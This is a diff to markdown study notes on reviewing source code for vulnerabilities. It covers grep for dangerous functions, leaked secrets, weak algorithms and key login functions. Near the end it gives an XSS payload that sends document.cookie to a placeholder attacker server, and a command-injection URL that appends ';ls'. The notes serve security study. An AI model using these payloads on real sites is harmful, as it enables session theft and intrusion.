@@ -2,7 +2,7 @@ Remember that, most of the time, you don’t have to be a master programmer to c
 But understanding the target’s particular language and architecture will allow you to spot more nuanced bugs.
 # The Fast Approach: grep Is Your Best Friend
 These techniques are speedy and often lead to the discovery of some of the most severe vulnerabilities, but they tend to leave out the more subtle bugs.
-### Dangerous Patterns
+## Dangerous Patterns
 Using the grep command, look for specific functions, strings, keywords, and coding patterns that are known to be dangerous
 The presence of these functions does not guarantee a vulnerability, but can alert you to possible vulnerabilities
 
@@ -16,7 +16,8 @@ The presence of these functions does not guarantee a vulnerability, but can aler
 | JavaScript | document.location.href()                                                                                        | Open redirect when used on unsanitized user input. document.location.href() changes the location of the user’s page.                                                                                                                                                                                      |
 | Ruby       | System(), exec(), %x(), backticks (`CODE`)                                                                      | RCE if used on unsanitized user input.                                                                                                                                                                                                                                                                    |
 | Ruby       | Marshall.load(), yaml.load()                                                                                    | Insecure deserialization if used on unsanitized user input                                                                                                                                                                                                                                               |
-### Leaked Secrets and Weak Encryption
+
+## Leaked Secrets and Weak Encryption
 - look for these issues by grepping for keywords such as (**key, secret, password, encrypt, API, login, or token**)
 - Grep the names of weak algorithms like **ECB, MD4, and MD5**
 - Grep for specific code import functions in the language you are using with keywords like import, require, and dependencies and search for any CVE's for them in [CVE database](https://cve.mitre.org/) 
@@ -31,7 +32,7 @@ The presence of these functions does not guarantee a vulnerability, but can aler
 
 # The Detailed Approach
 Instead of reading the entire codebase line by line, try these strategies to maximize your efficiency
-### Important Functions
+## Important Functions
 - focus on important functions, such as authentication, password reset, state-changing actions, and sensitive info reads 
 ```python
 # vulnerable login func example 
@@ -77,4 +78,3 @@ if preg_match("/example.com/", $redirect_url){
 - we can exploit the XSS using `https://example.com/<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;</script>`
 - Command injection with something like this 
   `https://example.com/download?download_file=https://example.com/download;ls`
-- 
